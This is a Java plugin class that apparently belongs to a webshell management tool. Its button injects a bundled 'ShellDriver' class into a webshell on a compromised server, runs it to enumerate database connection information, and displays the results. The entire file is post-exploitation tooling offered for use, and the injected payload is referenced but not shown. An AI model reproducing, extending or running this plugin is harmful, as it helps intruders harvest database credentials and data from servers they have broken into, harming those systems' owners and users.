package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "EnumDatabaseConn",
   DisplayName = "枚举数据库信息"
)
public class EnumDatabaseConn implements Plugin {
   private static final String CLASS_NAME = "plugin.ShellDriver";
   private final JPanel panel = new JPanel(new BorderLayout());
   private final JButton enumDatabaseConnButton = new JButton("EnumDatabaseConn");
   private boolean loadState;
   private ShellEntity shell;
   private Payload payload;
   private Encoding encoding;
   private final JSplitPane splitPane = new JSplitPane();
   private final JTextArea resultTextArea = new JTextArea();

   public EnumDatabaseConn() {
      this.splitPane.setOrientation(0);
      this.splitPane.setDividerSize(0);
      JPanel topPanel = new JPanel();
      topPanel.add(this.enumDatabaseConnButton);
      this.splitPane.setTopComponent(topPanel);
      this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
      this.panel.add(this.splitPane);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellDriver.classs");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("plugin.ShellDriver", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error((Throwable)var3);
         }
      }

   }

   private void enumDatabaseConnButtonClick(ActionEvent actionEvent) {
      if (!this.loadState) {
         this.load();
      }

      if (this.loadState) {
         byte[] result = this.payload.evalFunc("plugin.ShellDriver", "run", new ReqParameter());
         String resultString = this.encoding.Decoding(result);
         this.resultTextArea.setText(resultString);
      } else {
         Log.error("load EnumDatabaseConn Fail!");
      }

   }

   public void init(ShellEntity arg0) {
      this.shell = arg0;
      this.payload = arg0.getPayloadModule();
      this.encoding = Encoding.getEncoding(arg0);
   }
}
